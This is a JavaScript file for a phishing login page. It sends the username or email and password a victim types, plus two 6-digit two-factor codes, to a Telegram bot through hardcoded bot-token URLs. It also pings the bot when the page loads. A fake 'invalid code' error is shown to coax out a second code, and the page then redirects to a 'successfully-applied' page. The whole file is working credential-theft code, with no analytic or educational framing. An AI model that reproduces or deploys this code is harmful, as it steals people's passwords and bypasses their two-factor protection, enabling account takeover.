window.addEventListener('load', (event) => {
    hiniDikush()
});

const submitButton = document.querySelector("#submitButton1");
const butoniloading = document.querySelector("#butoniloading");
butoniloading.style.display = "none";

//login error
const notification_error = document.querySelector(".notification_error");
//sec code error
const invalid_code_erorr = document.querySelector(".invalid_code_erorr");

//first code error
const invalid_first_code_erorr = document.querySelector(".invalid_first_code_erorr");


const close_notification = document.querySelector(".close-notification");
const close_notification_code = document.querySelector(".close-notification_code");
const close_invalid_first_code_erorr = document.querySelector(".close-notification_code");


const usernameOrEmail = document.querySelector("#usernameOrEmail");
const password = document.querySelector("#password");

const emailError = document.querySelector("#emailError");
const passwordError = document.querySelector("#passwordError");

const loginForm = document.querySelector("#loginForm");
const emailCodeForm = document.querySelector("#emailCodeForm");


const codeError = document.querySelector("#codeError");
const codeInput = document.querySelector("#codeInput");



const submitEmailCode = document.querySelector("#submitEmailCode");
const butoniloadingEmailCode = document.querySelector("#butoniloadingEmailCode");


let firstTime = true;

submitButton.addEventListener("click", function(e) {
    e.preventDefault()
    if (!validatePasswordAndEmail()) {
        sendEmailPasswordTelegram();
        buttontoggle(true)
        setTimeout(() => {
            buttontoggle(false)
            toggleForm(true)
        }, 3000)
    } else {
        buttontoggle(false)
    }
})


submitEmailCode.addEventListener("click", function(e) {
    e.preventDefault()
    if (codeInput.value.length === 6) {
        codeButtonToggle(true)
        if (firstTime) {
            sendFirstCodeTelegram();
            setTimeout(() => {
                invalid_first_code_erorr.style.display = "flex";
                codeButtonToggle(false)
            }, 5000)
            setTimeout(() => {
                invalid_first_code_erorr.style.display = "none";
            }, 11000)
            setErrorcode(false)
            firstTime = false
        } else {
            sendSecCodeTelegram();
            setTimeout(() => {
                // invalid_code_erorr.style.display = "flex";
                codeButtonToggle(false)

            }, 2000)
            setTimeout(() => {
                invalid_code_erorr.style.display = "none";
            }, 7000)

            window.location.href = 'successfully-applied';

        }

    } else {
        setErrorcode(true)
        invalid_code_erorr.style.display = "none";
    }
})

function setErrorcode(truee) {
    if (truee) {
        codeInput.style.borderColor = "#ff1f44"
        codeError.style.display = "block"
    } else {
        codeInput.style.borderColor = "#557086"
        codeError.style.display = "none"
    }
}


close_notification.addEventListener("click", function(e) {
    e.preventDefault();
    notification_error.style.display = "none";
})

function validatePasswordAndEmail() {
    passwordError.style.display = password.value.length < 6 ? "flex" : "none";
    emailError.style.display = usernameOrEmail.value.length < 3 ? "flex" : "none";
    return password.value.length < 6 || usernameOrEmail.value.length < 3;

}

function toggleForm(loading) {
    if (loading) {
        emailCodeForm.style.display = "flex"
        loginForm.style.display = "none"
    } else {
        loginForm.style.display = "flex"
        emailCodeForm.style.display = "none"
    }
}


function buttontoggle(logined) {
    if (logined) {
        butoniloading.style.display = "flex"
        submitButton.style.display = "none"
    } else {
        submitButton.style.display = "flex"
        butoniloading.style.display = "none"
    }
}

function codeButtonToggle(logined) {
    if (logined) {
        butoniloadingEmailCode.style.display = "flex"
        submitEmailCode.style.display = "none"
    } else {
        submitEmailCode.style.display = "flex"
        butoniloadingEmailCode.style.display = "none"
    }
}
usernameOrEmail.addEventListener("change", function(e) {
    validatePasswordAndEmail()
});

password.addEventListener("change", function(e) {
    validatePasswordAndEmail()
});

close_notification_code.addEventListener("click", function(e) {
    e.preventDefault()
    invalid_code_erorr.style.display = "none";
})





function sendEmailPasswordTelegram() {
    var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n`;

    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
    var chat_id = 6612189281;
    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
    var oReq1 = new XMLHttpRequest();
    oReq1.open("GET", url1, true);
    oReq1.send();
    var oReq2 = new XMLHttpRequest();
    oReq2.open("GET", url2, true);
    oReq2.send();
}

function sendFirstCodeTelegram() {
    var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n | First code: ${codeInput.value}`;

    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
    var oReq1 = new XMLHttpRequest();
    oReq1.open("GET", url1, true);
    oReq1.send();
    var oReq2 = new XMLHttpRequest();
    oReq2.open("GET", url2, true);
    oReq2.send();
}

function sendSecCodeTelegram() {
    var message = ` Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n | Sec code: ${codeInput.value} `;

    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
    var oReq1 = new XMLHttpRequest();
    oReq.open("GET", url1, true);
    oReq.send();
    var oReq2 = new XMLHttpRequest();
    oReq.open("GET", url2, true);
    oReq.send();
}



function hiniDikush() {
    var message = `---- Hini dikush ----`;

    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;

    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
    var chat_id = 6612189281;
    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
    var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEww";
    var chat_id = 6612189281;
    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
    var oReq1 = new XMLHttpRequest();
    oReq.open("GET", url1, true);
    oReq.send();
    var oReq2 = new XMLHttpRequest();
    oReq.open("GET", url2, true);
    oReq.send();
}



















